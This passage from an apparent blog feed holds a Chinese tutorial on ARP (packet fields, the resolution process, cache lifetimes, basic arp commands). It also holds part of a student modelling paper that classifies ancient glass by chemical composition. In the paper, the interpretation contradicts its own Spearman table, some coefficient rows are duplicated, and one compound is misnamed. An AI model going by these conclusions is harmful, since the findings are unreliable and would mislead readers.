href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="D:\blog\shierjinghuang\source\_posts\地址解析协议ARP\ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><img src="D:\blog\shierjinghuang\source\_posts\地址解析协议ARP\ARP封装.png" style="zoom:80%;" /><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;地址解析协议-ARP&quot;&gt;&lt;a href=&quot;#地址解析协议-ARP&quot; class=&quot;headerlink&quot; title=&quot;地址解析协议 ARP&quot;&gt;&lt;/a&gt;地址解析协议 ARP&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;ARP的定义与基本功能&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
    <category term="ARP协议" scheme="https://shierjinghuang.github.io/tags/ARP%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>古代玻璃制品的成分分析与鉴别</title>
    <link href="https://shierjinghuang.github.io/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    <id>https://shierjinghuang.github.io/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</id>
    <published>2022-11-01T12:40:20.000Z</published>
    <updated>2025-03-27T07:45:18.787Z</updated>
    
    <content type="html"><![CDATA[<h2 id="古代玻璃制品的成分分析与鉴别"><a href="#古代玻璃制品的成分分析与鉴别" class="headerlink" title="古代玻璃制品的成分分析与鉴别"></a>古代玻璃制品的成分分析与鉴别</h2><p>[TOC]</p><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>本文基于一批我国古代玻璃制品的相关数据进行了古代玻璃制品的成分分析与鉴别，建立了古代玻璃制品鉴别模型，对各问题进行了分析。</p><p>对于问题一，针对玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关系的问题，计算玻璃类型、颜色、纹饰与表面风化的斯皮尔曼系数，分析相关性，得到结论“表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大”。为预测其风化前的化学成分含量，通过分析文物表面风化前后化学成分含量变化的统计学规律，结合聚类分析及多项式曲线拟合，对风化前数据进行了预测，预测详情数据见支撑材料。</p><p>对于问题二，首先，为得出高钾玻璃和铅钡玻璃的分类规律，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，采用统计学方法分析得出高钾玻璃、铅钡玻璃的分类规律。其次，为解决高钾玻璃和铅钡玻璃的亚类划分问题，运用SPSS工具，采用聚类分析法，依据各样本每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。聚类完成后再加以统计学分析，寻找其聚为一类的原因并从中提炼分类特征。最终聚类结果为：高钾玻璃分3类，分别为低铅钡玻璃、高磷玻璃、高铜玻璃；铅钡玻璃分5类，分别为高磷玻璃、高钠玻璃、高铝玻璃、钙铁玻璃、高铜玻璃。之后通过计算轮廓系数分析得到模型的合理性，并通过增添样本衡量分类结果的敏感性。</p><p>对于问题三，在对附件表单3中未知类别玻璃文物的化学成分进行分析时先将数据分为无风化和风化，之后经由表单2按照风化、无风化的标准通过箱图、散点图进行数据分析找出适合做自变量的化学成分，确定自变量和因变量从而建立多元回归模型。通过SPSS并依据建立的模型确定影响较高的化学成分进而推测其所属类型。可知高钾玻璃分别是A1、A4、A6、A7，铅钡玻璃分别是A2、A3、A5、A8。在敏感性分析上，更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><p>对于问题四，针对不同类别的玻璃文物样品，使用灰色关联分析法分析其化学成分之间的关联关系，得出不同种类的玻璃所含化学成分的关联系数并对其进行排序。通过对不同玻璃类型的数据进行灰色关联分析，得到几组不同的关系系数列表，通过各个关系系数列表的对比，体现不同种类玻璃化学成分关联关系的差异性。</p><p>关键词：<strong>多元回归</strong> <strong>斯皮尔曼系数</strong> <strong>聚类分析</strong> <strong>灰色关联分析</strong> </p><h3 id="一、问题重述"><a href="#一、问题重述" class="headerlink" title="一、问题重述"></a>一、问题重述</h3><h4 id="1-1问题背景"><a href="#1-1问题背景" class="headerlink" title="1.1问题背景"></a>1.1问题背景</h4><p>玻璃的出现与使用在人类的生活里已有四千多年的历史，早期的玻璃在西亚和埃及地区常被制作成珠形饰品。历史上古代玻璃经由丝绸之路传入我国，我国古代玻璃吸收其技术后在本土就地取材制作，因此与外来的玻璃制品外观相似，但化学成分却不相同。从西周到两汉时期中国境内玻璃制品化学成分的演变有自己独特的发展脉络，研究不同时期古代玻璃组成成分，对于了解古代金属冶炼技术与古代丝绸之路等有重大意义。</p><p>在长期的风化过程中，内部的各种氧化物与环境中的各种元素之间存在大量的物理和化学反应，一些组成元素的交换导致其组成比例的变化，这将影响对其类别的正确判断。</p><h4 id="1-2-具体问题重述"><a href="#1-2-具体问题重述" class="headerlink" title="1.2 具体问题重述"></a>1.2 具体问题重述</h4><p>现有一批我国古代玻璃制品的相关数据，考古工作者现已将其分为高钾玻璃和铅钡玻璃两种类型。</p><p>问题一：建立模型确定玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关联关系，并根据玻璃类型分析文物表面风化前后化学成分含量变化的统计规律。根据风化点的检测数据，建立预测模型，预测该文物风化前各化学成分的所占比例。</p><p>问题二：由附件表单2中的数据分析高钾玻璃和铅钡玻璃的分类规则；对于每个类别，通过聚类分析选择合适的化学成分来划分其子类，给出具体的分类方法和划分结果，并分析划分结果的合理性和敏感性。</p><p>问题三：对附件表单 3 中未知类别玻璃文物的化学成分分析，鉴别其类型，并对分类结果的敏感性进行分析。</p><p>问题四：分析不同类型的玻璃样品化学组成之间的关联，比较不同类别玻璃文物样品之间关联关系的差异。</p><h3 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h3><h4 id="2-1对问题一的分析"><a href="#2-1对问题一的分析" class="headerlink" title="2.1对问题一的分析"></a>2.1对问题一的分析</h4><h5 id="2-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#2-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="2.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>2.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>分析表面风化与玻璃类型、纹饰和颜色的关系是经典的相关性分析，可以通过皮尔逊系数或斯皮尔曼系数分析相关性。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，而玻璃类型、纹饰、颜色均为定类，而非定量故选择斯皮尔曼系数分析相关性。</p><h5 id="2-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#2-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="2.1.2文物样品表面有无风化化学成分含量的统计规律"></a>2.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>本文通过聚类分析，将14种不同变量进行聚类，并结合聚类结果，使用多项式曲线拟合，通过对不同指标的关系对风化前的化学成分利用构建的以小二乘法为思路的多元函数表达式进行求解。</p><p>经过数据处理后，可以发现高钾玻璃风化前后化学成分变化具有明显相关性，而铅钡玻璃则不具有明显相关性而无法使用多元线性回归模型求解。</p><p>继续通过多元线性回归模型预测高钾玻璃风化前数据，通过聚类结果并结合统计学规律预测铅钡玻璃风化前成分。</p><h4 id="2-2对问题二的分析"><a href="#2-2对问题二的分析" class="headerlink" title="2.2对问题二的分析"></a>2.2对问题二的分析</h4><p>要从化学成分含量角度分析高钾玻璃、铅钡玻璃的分类规律应建立在玻璃无风化、化学成分含量未被破坏的前提下，根据无风化状态下不同类型玻璃化学成分含量分布曲线，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，分析得出高钾玻璃、铅钡玻璃的分类规律。 </p><p>根据化学成分进行亚分类是一个聚类问题，事先并不知道要分为多少类，我们考虑使用系统聚类法，将各样本作为聚类对象，依据其每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。系统聚类完成后得出初步聚类结果，而后加以统计学分析，从化学成分含量的角度找出各聚类组合之所以聚为一类的原因，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。之后通过计算轮廓系数分析得到模型的合理性，并通过增添测试数据衡量分类的敏感性。</p><h4 id="2-3对问题三的分析"><a href="#2-3对问题三的分析" class="headerlink" title="2.3对问题三的分析"></a>2.3对问题三的分析</h4><p>在判别玻璃文物类型前，先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，之后对表单2的数据规律按照风化和无风化进行总结，找到适合作为自变量的化学成分，确定自变量和因变量从而建立多元回归模型。</p><p>建立回归模型后再通过给予的未知类别玻璃文物数据计算出的预测结果并根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃，最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p>敏感性分析上更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><h4 id="2-4对问题四的分析"><a href="#2-4对问题四的分析" class="headerlink" title="2.4对问题四的分析"></a>2.4对问题四的分析</h4><p>问题四属于相关性分析的问题类型，对于解决此类问题一般可以采用的分析方法包括多元线性回归模型，灰度分析等方法。</p><p>在问题一中，通过散点图和相关性分析可知，存在部分数据并不满足相关性，所以无法完全采用建立多元线性回归模型的方式完成分析，针对相关与不相关数据并存的情况，采用灰度关联分析的方式。求出相应的关联系数。</p><p>不同种类的玻璃其具有差异明显的化学成分关联关系，即具有对应关系系数，对关系系数进行排序，比较不同类别之间的化学成分关联关系的差异性。</p><h3 id="三、模型假设"><a href="#三、模型假设" class="headerlink" title="三、模型假设"></a>三、模型假设</h3><ol><li><p>附件表2中缺失数据部分，视为含量极小可以忽略不计；</p></li><li><p>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响；</p></li><li><p>不同类型玻璃，自身突出特性对其他化学成分的掩盖影响在划分亚类时应当剔除；</p></li><li><p>假设实验数据允许存在一定的误差范围；</p></li><li><p>假设在做对比实验时遵循控制变量法，控制其他实验条件完全相同；</p></li></ol><h3 id="四、符号说明及名词定义"><a href="#四、符号说明及名词定义" class="headerlink" title="四、符号说明及名词定义"></a>四、符号说明及名词定义</h3><table><thead><tr><th>符号</th><th>定义</th><th>单位</th></tr></thead><tbody><tr><td><img src=".\国赛数学建模\1.jpg" style="zoom:80%;" /></td><td>斯皮尔曼系数</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C2.jpg"></td><td>等级差</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C3.jpg"></td><td>多项式阶数</td><td>阶</td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C4.jpg"></td><td>比例系数</td><td></td></tr><tr><td>ρ</td><td>分辨系数</td><td></td></tr><tr><td>S</td><td>总轮廓系数</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C5.jpg"></td><td>关联度系数列表</td><td></td></tr></tbody></table><h3 id="五、模型的建立与求解"><a href="#五、模型的建立与求解" class="headerlink" title="五、模型的建立与求解"></a>五、模型的建立与求解</h3><h4 id="5-1问题一的求解与分析"><a href="#5-1问题一的求解与分析" class="headerlink" title="5.1问题一的求解与分析"></a>5.1问题一的求解与分析</h4><h5 id="5-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#5-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="5.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>5.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>**Step1.**表单1数据可视化</p><p>为了对这些玻璃文物的表面风化与其玻璃类型、纹饰和颜色的关系进行分析，我们首先对表单里的数据进行可视化，使用Python的matplotlib分别展示表面风化与玻璃类型、纹饰和颜色的数量关系条形图。其中，表单1的58个数据中，有3个铅钡风化玻璃的数据它的颜色变量是没有数据的，由于风化后的化学成分变化是不确定的，并且使用完整的55个数据进行可视化分析对表面风化与颜色的关系猜测影响很小，故在该步骤下删去。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps7.jpg"  /></center><center>图5-1 是否风化与玻璃种类的数量关系</center><img src=".\国赛数学建模\wps8.jpg"  /> <center>图5-2 是否与风化与玻璃纹饰的数量关系</center>![](.\国赛数学建模\wps9.jpg)![](.\国赛数学建模\wps10.jpg) <center>图5-3 是否风化与玻璃颜色数量关系</center>由折线图可知，铅钡玻璃数量较多，高钾玻璃数量较少。风化的铅钡玻璃数量较少，占比低，整体保存较好；而风化的高钾玻璃数量较多，占比高。其中，未风化的高钾玻璃只有蓝绿A纹玻璃和蓝绿B纹玻璃，高钾玻璃受风化影响较大。<p>**Step2.**斯皮尔曼系数关联性分析</p><p>我们根据条形图的数量关系可以猜测表面风化与玻璃类型间的关系最大，与颜色和纹饰间的关系很小。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，与表单1所给的定类变量而不是连续变量不符合。故我们选择利用斯皮尔曼系数，将定序数据划分等级0或1（风化或未风化，高钾或铅钡）、1<del>8（玻璃颜色）和1</del>3（玻璃纹饰）表示，运用公式（5-1）进行表面风化与玻璃类型、纹饰和颜色的关联性分析得出斯皮尔曼系数<img src=".\国赛数学建模\1.jpg" style="zoom:80%;" />。设X，Y为两组数据，其中X为自变量X=(x1, x2, x3)=(类型，纹饰，颜色)，Y为因变量是否表面风化，其斯皮尔曼（等级）相关系数：</p><img src=".\国赛数学建模\wps11.jpg"  /> <p>其中，<img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5Cwps15.jpg">为<img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5Cwps16.jpg">和之间的等级差。</p><p>使用SPASS软件，计算斯皮尔曼相关系数，分析各变量与表面风化的关系。呈现结果如下表所示：</p><p>表5-1 斯皮尔曼系数</p><table><thead><tr><th>因变量</th><th>相关系数</th><th>表面风化</th></tr></thead><tbody><tr><td>类型</td><td>相关系数</td><td>0.037</td></tr><tr><td>Sig.(双尾)</td><td>0.781</td><td></td></tr><tr><td>纹饰</td><td>相关系数</td><td>0.344</td></tr><tr><td>Sig.(双尾)</td><td>0.008</td><td></td></tr><tr><td>颜色</td><td>相关系数</td><td>-0.107</td></tr><tr><td>Sig.(双尾)</td><td>0.442</td><td></td></tr></tbody></table><p>通过表格可见，斯皮尔曼相关系数<img src=".\国赛数学建模\1.jpg" style="zoom:80%;" /></p>  ，位于-1和1之间，应用正确。记玻璃纹饰A、B、C为1、2、3。分析得玻璃纹饰与表面风化成正相关（斯皮尔曼相关系数大于0）。从玻璃纹饰角度考虑风化的概率C&gt;B&gt;A，显著性大于0.05说明玻璃纹饰与表面风化的相关性不显著。记高钾玻璃为1，铅钡玻璃为2。分析得玻璃类型与表面风化成正相关（斯皮尔曼相关系数大于0）且其相关性在0.01级别（双尾），相关性显著。从玻璃类型角度考虑风化的概率铅钡玻璃大于高钾玻璃。对蓝绿、浅蓝、紫、深绿、深蓝、浅绿、绿、黑色玻璃编号为1~8，根据斯皮尔曼相关性分析得玻璃颜色与表面风化成负相关，显著性在0.4级别，说明相关性不显著。从颜色角度讲风化概率蓝绿&lt;浅蓝&lt;紫&lt;深绿&lt;深蓝&lt;浅绿&lt;绿&lt;黑色玻璃。</p><p>综上，表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大。在接下来问题分析中，需要将玻璃类型考虑在内。</p><h5 id="5-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#5-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="5.1.2文物样品表面有无风化化学成分含量的统计规律"></a>5.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>**Step1.**表单2数据可视化</p><p>为了探究出文物样品表面有无风化化学成分含量的统计规律，我们统计出趋势、中位数、方差等。对数据进行均值比较和方差分析，根据结果使用Python进行数据可视化处理，画出无风化高钾玻璃和铅钡玻璃的化学成分比较折线图、高钾玻璃风化前后对比折线图和铅钡玻璃风化前后对比折线图进行观察。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps19.jpg" style="zoom: 67%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps20.jpg" style="zoom: 67%;" /></center><center>图5-4高钾玻璃风化前后对比折线图（加SiO2和不加SiO2）</center>高钾玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，因为风化导致除二氧化硅以外化学成分比例都降低（氧化钠和氧化钾降低较明显）使二氧化硅有些升高外，整体变化稳定。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps25.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps26.jpg" style="zoom:80%;" /></center><center>图5-5铅钡玻璃风化前后对比折线图（加二氧化硅和不加二氧化硅）</center>铅钡玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，除了因为风化导致部分化学成分降低使氧化铝和二氧化硅有明显升高外，其他元素比例变化稳定。<p>综上，风化前和风化后的化学成分比例整体变化一致，我们可以针对变化明显的化学成分进行分析找到倍数关系。</p><p>**Step2.**表单2数据处理</p><p>根据题目内容可知表单2给出的相应的主要成分所占比例累加和介于 85%<del>105%之间的数据视为有效数据。通过Excel求和公式，计算出69个文物采样点的主要成分所占比例累加和。其中文物采样点15累加和为79.47%和文物采样点17累加和为71.89%，二者不在85%</del>105%之间，故剔除数据。</p><p>通过对表单2的数据分类整理可知，高钾玻璃都不含有氧化锡，可以在高钾玻璃中不考虑该化学成分。同时，风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，无法寻找风化前和风化后的联系，化学成分预测上宜通过未风化中的化学成分规律。并且使用SPSS工具进行聚类分析，同样会优先将其中一种单独聚为一类，我们由此认定在该项聚类中，这部分数据没有意义，舍弃进行进一步聚类。</p><p>通过对风化前与风化后化学元素变化折线图5-5和5-6可知，铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变，可以认为风化前与风化后比例没有变化，在接下来分析中不做考虑。</p><p>对高钾玻璃和铅钡玻璃的剩余化学成分进行聚类分析，使用SPASS软件分析出化学成分集合分组，即由类似对象组成多个类的结果。处理结果如图5-4和图5-5所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps27.png" style="zoom:67%;" /> </center><center>图5-6高钾玻璃各化学成分聚类谱系图</center>分析高钾玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅作为第一类，氯化钾和氧化钙作为第二类，将氧化镁、氧化铝、氧化铁以及五氧化二磷作为第三类，将氧化铜作为第四类，从而实现数据的降维。将聚类结果和高钾玻璃统计规律的结果进行相互检验发现相符合。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps28.jpg" style="zoom:67%;" /> </center><center>图5-7铅钡玻璃各化学成分聚类谱系图</center>分析铅钡玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅、氧化钠以及氧化铁作为第一类，氧化钙、氧化铅、氧化锡及二氧化硫作为第二类，将氧化镁作为第三类，将氧化二磷作为第四类，从而实现数据的降维。将聚类结果和铅钡玻璃统计规律进行相互检验发现相符合。<h5 id="5-1-3预测风化点在风化前的化学成分含量"><a href="#5-1-3预测风化点在风化前的化学成分含量" class="headerlink" title="5.1.3预测风化点在风化前的化学成分含量"></a>5.1.3预测风化点在风化前的化学成分含量</h5><p>**Step1.**高钾玻璃风化前的化学成分含量预测</p><p>根据相关性分析（分析结果见附录），二氧化硅和其他变量间都是强相关性，可以以二氧化硅为因变量，其他化学成分为自变量，对高钾玻璃的散点图进行曲线拟合。我们选择多项式曲线拟合进行少量数据的情况下拟合出比较好的曲线，原理如下：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps29.jpg" style="zoom: 80%;" /></center> 其中M是多项式的阶数（最高次数），<img src=".\国赛数学建模\wps30.jpg" style="zoom:80%;" />是多项式的系数，记作W。<p>使用python软件的sklearn库和matplotlib库生成拟合图，如图5-4所示（文中仅展示部分代表，拟合发现同一类化学成分的曲线趋势基本相同）。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps31.jpg" style="zoom:80%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps32.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps33.jpg" style="zoom:80%;" /></center><center>图5-8二氧化硅与其他化学成分的曲线拟合（高钾玻璃）</center>接下来我们还要求出W，建立对应拟合曲线的拟合函数，求出二氧化硅和其他7个化学成分的W值。如下表5-2所示。<center>表5-2二氧化硅和其他7个化学成分的W值</center>| 因变量     |                              W                               || ---------- | :----------------------------------------------------------: || 氧化钾     | [9.35606172e-06 -2.57806774e-03 2.53723140e-01 -1.06974030e+01 1.75202587e+02] || 氧化铝     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铜     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铁     | [2.65598539e-05 -8.49958292e-03 1.00819891e+00 -5.25574184e+01 1.01817760e+03] || 氧化钙     | [-2.66096268e-05 8.24388435e-03 -9.44132282e-01 4.71535967e+01 -8.58821425e+02] || 五氧化二铅 | [1.54677974e-05 -4.92447555e-03 5.80303071e-01 -2.99966231e+01 5.74887003e+02] || 氧化镁     | [2.51296158e-05 -7.72761458e-03 8.82922501e-01 -4.44354852e+01 8.32682964e+02] |<p>最后，对高钾玻璃中风化点在风化前的化学成分含量进行预测（W值在实际使用时小数点取前四位）。</p><p>对于前面分析中高钾玻璃采样点都不含有氧化锡所以该部分选择不填值。风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，它们的化学含量占比小且最大差值小于2，我们可以用平均值表示这五个元素的化学含量。</p><center>表5-3化学成分比例平均值</center>| 化学成分 | 氧化钠 | 氧化铅 | 氧化钡 | 氧化锡 | 二氧化硫 || -------- | ------ | ------ | ------ | ------ | -------- || 平均值   | 2.7800 | 0.6420 | 1.7950 | 0.0975 | 0.4067   |<p>对于二氧化硅的未风化预测，根据前面分析，我们可以用一个比例系数K 来通过风化值求出未风化的值，利用统计规律求解出比例系数K=0.7280。</p><p>对于剩下的七个化学成分我们通过拟合出来的函数进行求解。最终未风化前的化学成分含量预测结果如下表5-4所示。</p><center>表5-4高钾玻璃中风化点在风化前的化学成分含量的预测结果</center>|        | SiO2    | Na2O   | K2O     | CaO     | MgO    | Al2O3  | Fe2O3  | CuO    | PbO    | BaO   | P2O5   | SrO    | SnO2 | SO2    || ------ | ------- | ------ | ------- | ------- | ------ | ------ | ------ | ------ | ------ | ----- | ------ | ------ | ---- | ------ || **7**  | 65.7673 | 2.7800 | 10.0032 | 11.5770 |        | 6.5340 | 1.6490 | 3.2400 | 0.6420 | 1.795 | 1.4701 | 0.0975 |      | 0.4067 || **9**  | 67.5920 | 2.7800 | 9.5951  | 4.2222  |        | 4.3560 | 3.1040 | 1.5500 | 0.6420 | 1.795 | 0.8435 | 0.0975 |      | 0.4067 || **1**  | 68.7067 | 2.7800 | 9.3013  | 1.4301  |        | 2.6730 | 2.5220 | 0.8400 | 0.6420 | 1.795 | 0.0000 | 0.0975 |      | 0.4067 || **12** | 66.9459 | 2.7800 | 9.7500  | 4.9032  |        | 4.8180 | 2.8130 | 1.6500 | 0.6420 | 1.795 | 0.3615 | 0.0975 |      | 0.4067 || **22** | 65.5685 | 2.7800 | 10.0422 | 11.3046 | 1.6400 | 11.550 | 3.3950 | 0.5500 | 0.6420 | 1.795 | 0.5061 | 0.0975 |      | 0.4067 || **27** | 65.8312 | 2.7800 | 9.9904  | 6.4014  | 1.5400 | 8.2830 | 1.9400 | 1.5400 | 0.6420 | 1.795 | 0.8676 | 0.0975 |      | 0.4067 |<p> **Step2.**铅钡玻璃风化前的化学成分含量预测</p><p>使用python软件的sklearn库和matplotlib库生成拟合曲线图，如图5-5所示：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps34.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps35.jpg" style="zoom:80%;" /></center><center>图5-9二氧化硅与其他化学成分的曲线拟合（铅钡玻璃）</center>通过图像可知，铅钡玻璃的散点图分布情况和高钾玻璃的散点图分布情况不一样，点在整张图上随机分布，故不能通过二氧化硅和其他化学成分拟合出合适的曲线进而得到拟合函数预测出铅钡玻璃风化前的化学成分含量。<p>根据上面聚类分析并结合表单2的统计学规律将铅钡玻璃所有变量划分为4个类，将其设为<img src=".\国赛数学建模\wps36.jpg" style="zoom:67%;" />。将铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变的4个变量的累加和设为定值<img src=".\国赛数学建模\wps37.jpg" style="zoom:67%;" />。根据统计学规律计算出的系数设为<img src=".\国赛数学建模\wps38.jpg" style="zoom:67%;" /> </p><p>建立模型为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps39.jpg" style="zoom:100%;" /> </center><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps40.jpg" style="zoom:100%;" /> 